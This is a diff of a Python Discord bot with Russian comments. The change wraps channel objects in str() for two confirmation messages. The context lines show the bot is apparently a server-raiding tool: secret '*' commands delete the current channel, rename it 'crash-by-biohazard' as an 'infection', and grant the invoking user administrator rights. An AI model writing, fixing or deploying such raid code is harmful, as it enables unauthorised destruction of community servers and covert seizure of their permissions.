@@ -192,12 +192,12 @@ class MyClient(discord.Client):
 			if message.content == '*канал-': #удаление текущего канала
 				await message.delete()
 				await message.channel.delete()
-				await message.author.send(':wastebasket: **Канал** `' + message.channel + '` **удалён безвозвратно!**')
+				await message.author.send(':wastebasket: **Канал** `' + str(message.channel) + '` **удалён безвозвратно!**')
 				
 			if message.content == '*заразаканал': #заражение текущего канала
 				await message.delete()
 				await message.channel.edit(name='crash-by-biohazard')
-				await message.author.send(':microbe: **Канал** `' + message.channel + '` **заражён!**')
+				await message.author.send(':microbe: **Канал** `' + str(message.channel) + '` **заражён!**')
 				
 			if message.content == '*админка': #выдаёт админку
 				await message.delete()
